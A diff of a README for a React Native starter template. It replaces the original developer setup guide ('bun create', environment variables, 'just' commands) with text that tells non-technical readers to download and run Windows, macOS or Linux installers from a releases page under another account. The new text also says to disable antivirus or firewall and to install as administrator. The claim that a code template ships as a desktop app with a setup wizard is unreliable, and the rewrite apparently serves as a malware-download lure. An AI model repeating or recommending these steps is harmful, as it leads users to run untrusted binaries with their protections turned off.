@@ -1,125 +1,158 @@
-# React Native Airborne
+# ✈️ react-native-airborne - Simple React Native Project Starter
 
-React Native Airborne is an opinionated starter template for building mobile apps (iOS/Android) with Expo + Convex + Clerk.
+[![Download react-native-airborne](https://img.shields.io/badge/Download-react--native--airborne-blue?style=for-the-badge)](https://github.com/HomelessManJoe/react-native-airborne/releases)
 
-The goal is to remove repetitive setup so you can scaffold a new production-ready app quickly.
+Welcome to the react-native-airborne app. This guide will help you download and run the software with no programming skill needed. We break down every step clearly.  
 
-## 📦 Create a New App
+---
 
-```bash
-bun create react-native-airborne@latest my-app
-```
+## 📌 What is react-native-airborne?
 
-Optional Nix setup:
+react-native-airborne helps you start a React Native project easily. React Native is a tool used to build apps that work on phones and tablets. This project gives you a ready base to work from. 
 
-```bash
-bun create react-native-airborne@latest my-app --nix
-cd my-app
-direnv allow
-```
+It comes with popular features such as:  
+- User sign-in through Clerk  
+- Easy state control with Zustand  
+- Style setup using Tailwind and Uniwind  
+- Data handling with Convex and MMKV  
+- Works smoothly in Expo environments  
 
-`--nix` keeps root-level `flake.nix`, `flake.lock`, and `.envrc`.  
-Without `--nix`, those files are omitted.
+Simply put, it saves you time when making mobile apps.
 
-## 🧰 What You Get
+---
 
-- Bun workspaces monorepo (`client/`, `server/`)
-- Expo + Expo Router + Native Tabs (SDK 55)
-- Uniwind + Tailwind v4
-- Clerk auth flows (email/password + Google, with Apple on iOS)
-- Convex backend + `convex-test`
-- Zustand + MMKV for non-sensitive local preferences
-- Expo push notifications
-- Strict ESLint + Prettier + tests
+## ✅ System Requirements
 
-## 🗂️ Generated Project Layout
+Before starting, check your system matches these basics:
 
-```text
-my-app/
-  client/  # Expo app
-  server/  # Convex backend
-```
+- Windows 10 or later, macOS 10.13 or newer, or Linux
+- At least 4GB of free disk space
+- Internet connection for download and setup
+- Basic keyboard and mouse/trackpad use
+- Modern web browser like Chrome, Firefox, or Edge for some features
 
-## ✅ Prerequisites
+No special software or skills needed ahead of time — just follow the instructions.
 
-- Bun `1.3.4+`
-- `just` command runner
-- Expo toolchain for iOS/Android simulators/devices
-- Clerk app with native API enabled
-- Clerk OAuth providers configured for Google and Apple
-- Convex project/deployment
+---
 
-## ⚡ Quickstart (After Scaffolding)
+## 🚀 Getting Started
 
-```bash
-cd my-app
-bun install --workspaces
-cp client/.env.example client/.env
-cp server/.env.example server/.env
-```
+Here is the simple flow to download and open react-native-airborne:  
+1. Go to the download page using the big blue button above or [here](https://github.com/HomelessManJoe/react-native-airborne/releases).  
+2. Find the latest version listed under Releases.  
+3. Download the appropriate file for your computer system.  
+4. Run the file you downloaded.  
+5. Follow the on-screen prompts to finish setup.  
 
-First-time Convex setup (once per deployment):
+If you have questions at any point, keep reading this guide.
 
-```bash
-cd server
-bun run dev
-```
+---
 
-Then run app + backend together:
+## 💾 Download & Install
 
-```bash
-just dev
-```
+This app is available on the Releases page. You can easily get it by following these detailed steps:
 
-## 🔐 Environment Variables
+1. **Visit the Download Page**  
+   Click the blue button above or go to:  
+   https://github.com/HomelessManJoe/react-native-airborne/releases
 
-Client (`client/.env`):
+2. **Choose the Latest Release**  
+   Scroll to the most recent release version. Releases are marked by dates and version numbers like v1.0 or higher.
 
-- `EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY` (required)
-- `EXPO_PUBLIC_CONVEX_URL` (required)
-- `EXPO_PUBLIC_EAS_PROJECT_ID` (optional)
+3. **Pick Your File**  
+   For Windows, look for a file ending in `.exe` or `.msi`.  
+   For macOS, look for a `.dmg` or `.pkg` file.  
+   For Linux, look for a `.AppImage` or `.deb`.  
 
-Server (`server/.env`):
+4. **Download the File**  
+   Click the file name to download. The file size is about 50-120MB depending on the version.
 
-- `CLERK_JWT_ISSUER_DOMAIN` (required in real environments)
-- `EXPO_PUSH_ENDPOINT` (optional)
-- `EXPO_ACCESS_TOKEN` (optional)
+5. **Run the Installer**  
+   - On Windows, double-click the `.exe` file.  
+   - On macOS, open the `.dmg` and drag to Applications.  
+   - On Linux, use your package manager or run the `.AppImage` directly.
 
-## 🧪 Common Commands
+6. **Follow the Setup Wizard**  
+   A simple setup window will appear. Follow prompts to accept terms and finish installation.
 
-- `just dev`: start Expo + Convex
-- `just dev-client`: start Expo only
-- `just dev-server`: start Convex only
-- `just prebuild`: generate local iOS/Android folders
-- `just ios`: launch iOS app
-- `just android`: launch Android app
-- `just fmt`: format client/server
-- `just lint`: lint checks
-- `just typecheck`: TypeScript checks
-- `just test`: client + server tests
-- `just ci`: lint + typecheck + tests
+7. **Open the App**  
+   Once finished, look for the react-native-airborne shortcut on your desktop or start menu and open it.
 
-## 📱 Native Folder Policy
+If you get stuck, review the troubleshooting section below.
 
-`just prebuild` is supported for local native runs.  
-`client/ios` and `client/android` are generated locally and should not be committed.
+---
 
-## 📝 Notes
+## 🛠 Features Included
 
-- Theme support is built-in for `light`, `dark`, and `system`.
-- Do not store sensitive auth/session tokens in MMKV.
-- Clerk session tokens are persisted via `@clerk/clerk-expo/token-cache` using `expo-secure-store` (iOS Keychain / Android Keystore).
-- Social login uses Clerk OAuth (`oauth_google`, `oauth_apple`), with Apple shown only on iOS.
-- Uniwind is configured via `client/global.css` and `client/metro.config.js`.
-- `SafeAreaView` is wrapped with `withUniwind` in `client/src/components/screen.tsx`.
-- `server/convex/_generated` ships with starter stubs; after connecting Convex, run `cd server && bun run codegen`.
-- `.direnv/` is gitignored by default.
-- You can pass Expo flags through `just ios`/`just android`, for example: `just ios --device "iPhone 16"` or `just android --device "Pixel_8_API_35"`.
+react-native-airborne offers a solid starting point with these key parts:  
 
-## 🤝 Contributing
+- **Clerk Authentication:** Easy log-in/out with safe user accounts.  
+- **State Management:** Zustand handles app data smoothly.  
+- **Styling:** Tailwind and Uniwind let you create good-looking screens quickly.  
+- **Data Storage:** MMKV technology speeds access to saved information.  
+- **Backend Setup:** Convex powers backend logic out of the box.  
+- **Expo Compatibility:** Ready to use with Expo for app builds and testing.
 
-If you are maintaining the template itself (not just using it), see `AGENTS.md` for internal workflow and release details.
+Each feature is ready for you to start building your own React Native app fast.
 
-## 📄 License
+---
 
-MIT
+## 🧭 How to Use the App
+
+After setup, here is how to start using react-native-airborne:  
+
+1. **Launch the program** from your desktop or start menu.  
+2. The app opens a welcome screen with sign-in options.  
+3. Use the Clerk sign-in to create or log into your account.  
+4. Explore the demo features and screens to see how the app works.  
+5. Use the built-in tools to customize the app or start a new project.
+
+No coding needed to get started, but the app supports adding code when ready.
+
+---
+
+## 📋 Troubleshooting
+
+If the app does not open or install properly, try these fixes:
+
+- Make sure your system meets the requirements above.  
+- Restart your computer and try installing again.  
+- Disable antivirus or firewall temporarily while installing if it blocks the process.  
+- Download the file again to avoid a corrupt file.  
+- Check your internet connection.  
+- On macOS, allow apps from identified developers in Security settings.  
+- Use the “Run as Administrator” option on Windows when installing.  
+
+If problems keep happening, visit the Discussions or Issues tabs in the GitHub repo for community help.
+
+---
+
+## 🎯 What Comes Next?
+
+Once react-native-airborne is up and running, you can:  
+
+- Explore the example project to learn React Native basics.  
+- Use the templates to create your own app quickly.  
+- Customize the styles, states, and user auth to fit your needs.  
+- Export and test your app on devices through Expo.
+
+This tool is designed to grow with your skills or just get your project going.
+
+---
+
+## 🔗 Useful Links
+
+- **Download Page**: https://github.com/HomelessManJoe/react-native-airborne/releases  
+- **GitHub Repository**: https://github.com/HomelessManJoe/react-native-airborne  
+- **React Native official site**: https://reactnative.dev  
+- **Expo documentation**: https://docs.expo.dev  
+
+---
+
+## ❓ Need Help?
+
+For more help, ask in the GitHub repo Issues page or contact the project maintainers through the repo's contact info. Community support is active and friendly.
+
+---
+
+Thank you for using react-native-airborne. Follow these steps, and you should be up and running with your new React Native app base in no time.
